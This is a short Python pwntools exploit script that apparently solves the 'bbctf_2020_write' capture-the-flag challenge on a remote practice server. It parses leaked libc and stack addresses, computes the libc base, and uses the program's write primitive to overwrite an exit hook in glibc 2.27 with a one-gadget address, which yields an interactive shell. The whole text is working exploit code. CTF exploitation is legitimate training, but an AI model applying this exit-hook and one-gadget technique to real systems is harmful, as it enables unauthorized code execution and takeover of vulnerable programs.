from pwn import *

context.log_level = "debug"

exe = ELF("./bbctf_2020_write")
libc = ELF("./libc-2.27.so")
# r = exe.process()
r = remote("node4.buuoj.cn", 26320)

r.recvuntil(b"puts: ")
libc_puts = int(r.recvline(), 16)
r.recvuntil(b"stack: ")
stack = int(r.recvline(), 16)
success("libc puts: " + hex(libc_puts))
success("stack addr: " + hex(stack))

libc_base = libc_puts - libc.sym["puts"]
exit_hook = libc_base + 0x619F68
onegadget = libc_base + 0x4F322
# __rtld_lock_lock_recursive or __rtld_lock_unlock_recursive

r.recvuntil(b"(q)uit\n")
r.sendline(b"w")

r.recvuntil(b"ptr: ")
r.sendline(str(exit_hook).encode())
r.recvuntil(b"val: ")
r.sendline(str(onegadget).encode())

r.recvuntil(b"(q)uit\n")
r.sendline(b"q")
r.interactive()
# don't work on glibc 2.38
